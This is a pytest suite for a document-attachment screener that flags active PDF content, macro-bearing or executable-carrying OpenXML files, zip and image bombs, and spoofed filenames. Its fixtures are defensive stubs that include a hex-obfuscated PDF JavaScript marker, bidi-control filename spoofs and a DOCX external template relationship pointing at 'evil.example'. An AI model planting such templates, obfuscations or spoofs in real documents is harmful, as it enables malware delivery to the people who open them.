"""Unit tests for po_materials/po_attach_screen.py — the §34 DOC-attachment screener
(Feature B; the PDF/OpenXML/image sibling of safety_reports/photo_screen).

Pure-bytes tests (no live infra, no network): every fixture is crafted in-memory —
a minimal valid PDF, a PDF carrying /JavaScript (active content), OpenXML zips with
and without vbaProject.bin / nested executables, cap-tripping zips (caps
monkeypatched down so the MECHANISM is proven without building 100MB fixtures),
Pillow-generated clean images, and magic/extension/MIME mismatches.

PROVE-THE-CONTROL-BITES anchor: `test_docx_with_macro_payload_is_malicious` and
`test_pdf_with_javascript_is_suspicious` FAIL if the screener is stubbed to return
"clean" — and `tests/test_po_poll.py::test_attachment_malicious_refused_never_filed`
fails if `po_poll` stops calling the screener before Box (the wiring proof).

The cross-language HMAC vector at the bottom pins the po-att:v1 canonical against
the Worker (safety_portal/worker/po_attachments.ts poAttachmentCanonical + hmacHex
— same secret, same literal expected hex).

Run with: pytest -q tests/test_po_attach_screen.py
"""
from __future__ import annotations

import io
import sys
import zipfile

import pytest
from PIL import Image

from po_materials import po_attach_screen as pas
from shared import portal_hmac

MIME_PDF = "application/pdf"
MIME_PNG = "image/png"
MIME_JPEG = "image/jpeg"


# ---- fixture builders ---------------------------------------------------------------


def minimal_pdf(extra: bytes = b"") -> bytes:
    return b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n" + extra + b"\ntrailer\n%%EOF\n"


def openxml_zip(mime: str, extra_entries: dict[str, bytes] | None = None) -> bytes:
    """A structurally-plausible OpenXML container for the declared mime."""
    root = "word" if mime == pas.MIME_DOCX else "xl"
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr(f"{root}/document.xml", "<doc/>")
        for name, data in (extra_entries or {}).items():
            zf.writestr(name, data)
    return buf.getvalue()


def png_bytes(size: tuple[int, int] = (32, 32)) -> bytes:
    img = Image.new("RGB", size, (10, 120, 60))
    out = io.BytesIO()
    img.save(out, format="PNG")
    return out.getvalue()


def jpeg_bytes(size: tuple[int, int] = (32, 32)) -> bytes:
    img = Image.new("RGB", size, (200, 40, 40))
    out = io.BytesIO()
    img.save(out, format="JPEG")
    return out.getvalue()


# ---- L1: static signatures / consistency --------------------------------------------


def test_empty_is_suspicious():
    r = pas.screen_attachment("a.pdf", MIME_PDF, b"")
    assert (r.disposition, r.layer) == ("suspicious", "L1")


def test_oversize_is_suspicious(monkeypatch):
    monkeypatch.setattr(pas, "MAX_ATTACHMENT_BYTES", 64)
    r = pas.screen_attachment("a.pdf", MIME_PDF, b"x" * 65)
    assert (r.disposition, r.layer) == ("suspicious", "L1")
    assert r.detail.startswith("oversize:")


def test_disallowed_mime_is_suspicious():
    r = pas.screen_attachment("a.doc", "application/msword", b"\xd0\xcf\x11\xe0old-ole")
    assert (r.disposition, r.layer) == ("suspicious", "L1")
    assert r.detail.startswith("mime_not_allowed:")


def test_extension_mime_mismatch_is_suspicious():
    r = pas.screen_attachment("a.png", MIME_PDF, minimal_pdf())
    assert (r.disposition, r.detail) == ("suspicious", "extension_mime_mismatch")


def test_magic_mismatch_is_suspicious():
    # PNG bytes under a .pdf name + PDF MIME — the classic disguise.
    r = pas.screen_attachment("a.pdf", MIME_PDF, png_bytes())
    assert (r.disposition, r.detail) == ("suspicious", "magic_mismatch")


# ---- L2: PDF ------------------------------------------------------------------------


def test_minimal_pdf_is_clean():
    r = pas.screen_attachment("spec.pdf", MIME_PDF, minimal_pdf())
    assert r.disposition == "clean"


@pytest.mark.parametrize("marker", [b"/JavaScript", b"/JS", b"/OpenAction", b"/AA",
                                    b"/Launch", b"/EmbeddedFile", b"/RichMedia"])
def test_pdf_with_active_content_is_suspicious(marker):
    r = pas.screen_attachment("spec.pdf", MIME_PDF, minimal_pdf(b"<< " + marker + b" 5 0 R >>"))
    assert (r.disposition, r.layer) == ("suspicious", "L2")
    assert r.detail.startswith("pdf_active_content:")
    # …and this class is the one the caller security-flags.
    assert pas.is_structural_active_content(r)


def test_pdf_with_javascript_is_suspicious():
    """The prove-the-control-bites anchor for the PDF layer (named in the PR body)."""
    r = pas.screen_attachment("spec.pdf", MIME_PDF, minimal_pdf(b"<< /JavaScript (app.alert(1)) >>"))
    assert r.disposition == "suspicious"


def test_pdf_without_eof_trailer_is_suspicious():
    r = pas.screen_attachment("spec.pdf", MIME_PDF, b"%PDF-1.4\ntruncated")
    assert (r.disposition, r.detail) == ("suspicious", "pdf_no_eof_trailer")


def test_plain_verdicts_are_not_flagged_structural():
    r = pas.screen_attachment("spec.pdf", MIME_PDF, b"%PDF-1.4\ntruncated")
    assert not pas.is_structural_active_content(r)


# ---- L2: OpenXML --------------------------------------------------------------------


def test_valid_docx_and_xlsx_are_clean():
    assert pas.screen_attachment("s.docx", pas.MIME_DOCX, openxml_zip(pas.MIME_DOCX)).disposition == "clean"
    assert pas.screen_attachment("s.xlsx", pas.MIME_XLSX, openxml_zip(pas.MIME_XLSX)).disposition == "clean"


def test_docx_with_macro_payload_is_malicious():
    """The prove-the-control-bites anchor for the OpenXML layer (named in the PR body)."""
    data = openxml_zip(pas.MIME_DOCX, {"word/vbaProject.bin": b"\x00macro"})
    r = pas.screen_attachment("s.docx", pas.MIME_DOCX, data)
    assert (r.disposition, r.detail) == ("malicious", "openxml_macro_payload")


def test_docx_with_nested_executable_is_malicious():
    data = openxml_zip(pas.MIME_DOCX, {"word/embeddings/payload.exe": b"MZ\x90\x00"})
    r = pas.screen_attachment("s.docx", pas.MIME_DOCX, data)
    assert r.disposition == "malicious"
    assert r.detail.startswith("openxml_nested_executable:")


def test_zip_decompression_bomb_is_malicious(monkeypatch):
    # Cap monkeypatched down so the mechanism is proven without a 100MB fixture:
    # DECLARED (central-directory) sizes trip the cap before any decompression.
    monkeypatch.setattr(pas, "MAX_ZIP_TOTAL_UNCOMPRESSED", 1024)
    data = openxml_zip(pas.MIME_DOCX, {"word/huge.xml": b"0" * 4096})
    r = pas.screen_attachment("s.docx", pas.MIME_DOCX, data)
    assert (r.disposition, r.layer) == ("malicious", "L2")
    assert r.detail.startswith("zip_decompression_bomb:")


def test_zip_entry_bomb_is_malicious(monkeypatch):
    monkeypatch.setattr(pas, "MAX_ZIP_ENTRIES", 4)
    data = openxml_zip(pas.MIME_DOCX, {f"word/e{i}.xml": b"x" for i in range(6)})
    r = pas.screen_attachment("s.docx", pas.MIME_DOCX, data)
    assert r.disposition == "malicious"
    assert r.detail.startswith("zip_entry_bomb:")


def test_corrupt_zip_is_suspicious():
    r = pas.screen_attachment("s.docx", pas.MIME_DOCX, b"PK\x03\x04not-actually-a-zip")
    assert (r.disposition, r.detail) == ("suspicious", "openxml_unreadable_zip")


def test_missing_content_types_is_suspicious():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("word/document.xml", "<doc/>")
    r = pas.screen_attachment("s.docx", pas.MIME_DOCX, buf.getvalue())
    assert (r.disposition, r.detail) == ("suspicious", "openxml_missing_content_types")


def test_container_extension_mismatch_is_suspicious():
    # An xlsx payload tree under a .docx name/MIME — a disguised container.
    r = pas.screen_attachment("s.docx", pas.MIME_DOCX, openxml_zip(pas.MIME_XLSX))
    assert (r.disposition, r.detail) == ("suspicious", "openxml_container_mismatch:word")


# ---- L2: images ---------------------------------------------------------------------


def test_valid_png_and_jpeg_are_clean():
    assert pas.screen_attachment("d.png", MIME_PNG, png_bytes()).disposition == "clean"
    assert pas.screen_attachment("d.jpg", MIME_JPEG, jpeg_bytes()).disposition == "clean"


def test_pillow_invalid_image_is_suspicious():
    # JPEG magic followed by garbage — opens nowhere.
    r = pas.screen_attachment("d.jpg", MIME_JPEG, b"\xff\xd8\xff" + b"\x00" * 64)
    assert (r.disposition, r.layer) == ("suspicious", "L2")
    assert r.detail.startswith("unreadable:")


def test_image_decompression_bomb_is_malicious(monkeypatch):
    monkeypatch.setattr(pas, "MAX_IMAGE_PIXELS", 16 * 16 - 1)
    r = pas.screen_attachment("d.png", MIME_PNG, png_bytes((16, 16)))
    assert (r.disposition, r.layer) == ("malicious", "L2")
    assert r.detail.startswith("decompression_bomb:")


# ---- L3: ClamAV gate ----------------------------------------------------------------


def test_clamav_gate_default_off_short_circuits(monkeypatch):
    """With the gate OFF (the shipped default) pyclamd is never even imported."""
    import builtins

    real_import = builtins.__import__

    def deny_pyclamd(name, *args, **kwargs):
        if name == "pyclamd":
            raise AssertionError("pyclamd imported despite clamav_enabled=False")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", deny_pyclamd)
    r = pas.screen_attachment("spec.pdf", MIME_PDF, minimal_pdf())
    assert r.disposition == "clean"
    assert r.layer == "L2"  # verdict produced without the L3 pass


def test_clamav_enabled_but_unavailable_is_suspicious(monkeypatch):
    """Gate ON + no pyclamd → fail-closed to review, never a blind pass."""
    monkeypatch.setitem(sys.modules, "pyclamd", None)  # import raises ImportError-ish
    monkeypatch.delitem(sys.modules, "pyclamd", raising=False)
    import builtins

    real_import = builtins.__import__

    def no_pyclamd(name, *args, **kwargs):
        if name == "pyclamd":
            raise ImportError("not installed")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", no_pyclamd)
    r = pas.screen_attachment("spec.pdf", MIME_PDF, minimal_pdf(), clamav_enabled=True)
    assert (r.disposition, r.layer) == ("suspicious", "L3")
    assert r.detail.startswith("clamav_unavailable:")


def test_clamav_found_is_malicious(monkeypatch):
    monkeypatch.setattr(pas, "_clamav_scan", lambda raw: ("FOUND", "Eicar-Test-Signature"))
    r = pas.screen_attachment("spec.pdf", MIME_PDF, minimal_pdf(), clamav_enabled=True)
    assert (r.disposition, r.layer) == ("malicious", "L3")
    assert r.detail == "clamav:Eicar-Test-Signature"


def test_clamav_ok_is_clean(monkeypatch):
    monkeypatch.setattr(pas, "_clamav_scan", lambda raw: ("OK", None))
    r = pas.screen_attachment("spec.pdf", MIME_PDF, minimal_pdf(), clamav_enabled=True)
    assert (r.disposition, r.layer) == ("clean", "L3")


# ---- po-att:v1 cross-language HMAC vector -------------------------------------------


def test_po_attachment_hmac_cross_language_vector():
    """The SAME fixed vector is pinned Worker-side (po_attachments.test.ts recomputes
    hmacHex over poAttachmentCanonical with the test secret) — byte-identical
    canonicals on both sides produce this literal hex."""
    signed = portal_hmac.sign_po_attachment(
        "test-hmac-payload-secret",
        att_uuid="0f4a8e1c-1111-2222-3333-444455556666",
        po_id=7,
        filename="spec sheet.pdf",
        declared_mime="application/pdf",
        size_bytes=20,
        sha256="aa" * 32,
    )
    assert signed == "9a1eaa8cccf781c9f565e703aba1e551d01925d6df770a2c8acd568bba786447"
    assert portal_hmac.verify_po_attachment(
        "test-hmac-payload-secret", signed,
        att_uuid="0f4a8e1c-1111-2222-3333-444455556666", po_id=7,
        filename="spec sheet.pdf", declared_mime="application/pdf",
        size_bytes=20, sha256="aa" * 32,
    )
    # Any single field flip fails verify (the canonical binds them all).
    assert not portal_hmac.verify_po_attachment(
        "test-hmac-payload-secret", signed,
        att_uuid="0f4a8e1c-1111-2222-3333-444455556666", po_id=8,
        filename="spec sheet.pdf", declared_mime="application/pdf",
        size_bytes=20, sha256="aa" * 32,
    )


# ---- review-fix additions (items 4/5/6) ----------------------------------------------


def test_filename_bidi_format_controls_are_suspicious():
    """Review W8/attacker#4 — the Mac-side mirror of the Worker's filename gate:
    RTLO / zero-width / bidi-isolate names are display spoofs and refuse at L1."""
    for name in (
        "spec‮gpj.pdf",   # RTLO
        "zero​width.pdf",  # zero-width space
        "iso⁦late.pdf",    # bidi isolate
        "bom﻿.pdf",        # ZWNBSP/BOM
        "path/sep.pdf",         # path separator (pre-existing class, same gate)
        ".hidden.pdf",          # leading dot
    ):
        r = pas.screen_attachment(name, MIME_PDF, minimal_pdf())
        assert (r.disposition, r.layer) == ("suspicious", "L1"), name
        assert r.detail == "filename_format_controls", name


def test_pdf_hex_name_escape_obfuscation_detected():
    """Review truthful-posture (b): /#4A…-escaped markers normalize before the scan —
    the cheapest obfuscation no longer slips through."""
    escaped = minimal_pdf(b"<< /#4Aava#53cript (app.alert(1)) >>")
    assert b"/JavaScript" not in escaped  # raw bytes do NOT contain the plain marker
    r = pas.screen_attachment("spec.pdf", MIME_PDF, escaped)
    assert (r.disposition, r.layer) == ("suspicious", "L2")
    assert r.detail == "pdf_active_content:JavaScript"
    assert pas.is_structural_active_content(r)


def test_docx_external_attached_template_rels_is_suspicious():
    """Review attacker#2: a TargetMode="External" relationship naming an
    attachedTemplate (remote-template fetch on open — macro-less vector) refuses."""
    rels = (
        b'<?xml version="1.0"?><Relationships>'
        b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
        b'officeDocument/2006/relationships/attachedTemplate" '
        b'Target="http://evil.example/t.dotm" TargetMode="External"/>'
        b"</Relationships>"
    )
    data = openxml_zip(pas.MIME_DOCX, {"word/_rels/settings.xml.rels": rels})
    r = pas.screen_attachment("s.docx", pas.MIME_DOCX, data)
    assert (r.disposition, r.detail) == ("suspicious", "openxml_external_relationship")
    assert pas.is_structural_active_content(r)  # the caller security-flags it


def test_docx_internal_rels_stay_clean():
    """A normal internal relationship part (every real docx has them) must NOT trip
    the external-relationship check — no TargetMode="External"."""
    rels = (
        b'<?xml version="1.0"?><Relationships>'
        b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
        b'officeDocument/2006/relationships/styles" Target="styles.xml"/>'
        b"</Relationships>"
    )
    data = openxml_zip(pas.MIME_DOCX, {"word/_rels/document.xml.rels": rels})
    assert pas.screen_attachment("s.docx", pas.MIME_DOCX, data).disposition == "clean"


def test_docx_embedded_ole_object_is_suspicious():
    data = openxml_zip(pas.MIME_DOCX, {"word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0"})
    r = pas.screen_attachment("s.docx", pas.MIME_DOCX, data)
    assert (r.disposition, r.detail) == ("suspicious", "openxml_ole_object")
    assert pas.is_structural_active_content(r)
